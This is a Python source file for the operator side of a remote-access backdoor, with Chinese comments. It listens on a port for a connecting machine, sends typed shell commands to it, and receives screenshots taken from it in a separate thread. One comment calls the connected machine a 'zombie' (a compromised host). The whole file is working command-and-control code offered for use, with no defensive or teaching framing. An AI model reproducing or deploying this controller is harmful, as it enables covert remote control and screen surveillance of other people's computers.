import socket
import sys
import threading
import struct
import os

server_ip = ""
server_port = 8022
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def service():
    # 抛出错误
    try:
        # 创建套接字
        # server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # 配置端口释放规则,1代表立即释放,默认2min
        server_addr = (server_ip, server_port)
        server.bind(server_addr)
        server.listen(10)
    except socket.error as e:
        print("*建立Socket失败,由于:", e, sep="")
        sys.exit(1)

    print("Wainting for Connection...")

    new_socket, client_addr = server.accept()
    # 循环，业务等待
    data = new_socket.recv(10240)
    print(data.decode())
    while True:

        cmd = input("shell >>> ")
        new_socket.send(cmd.encode())
        if cmd == "mexit":
            break
        elif cmd == "screenshot":
            t = threading.Thread(target=receiveDataFromClient, args=(new_socket, client_addr))
            t.start()
        else:
            data = new_socket.recv(10240)
            print(data.decode())


# 多线程接收数据
def receiveDataFromClient(clientsocket, clientaddr):
    # 成功连接肉鸡的提示
    # print("肉鸡来了{}".format(clientaddr))
    while True:
        # 设定单次接收图片的数据流大小为128bytes
        fileinfosize = struct.calcsize("128sl")
        fileinfopck = clientsocket.recv(fileinfosize)
        # 如果数据流非空
        if fileinfopck:
            # 解包
            filename, filesize = struct.unpack("128sl", fileinfopck)
            filename = filename.strip(str.encode("\00"))

            # 接收图片
            newfilename = os.path.join(str.encode("./"), str.encode("new_") + filename)
            # print("接收文件{},另存为{}".format(filename, newfilename))

            # 统计接收量
            recv_file_size = 0
            # 创建缓存文件
            tempfile = open(newfilename, "wb")
            # 判断分段数据，写入缓存文件
            while not recv_file_size == filesize:
                if filesize - recv_file_size > 1024:
                    recvdata = clientsocket.recv(1024)
                    recv_file_size += len(recvdata)
                else:
                    recvdata = clientsocket.recv(filesize - recv_file_size)
                    recv_file_size = filesize
                tempfile.write(recvdata)

            tempfile.close()
            # print("文件接收完成,保存在{}".format(newfilename))


if __name__ == "__main__":
    service()

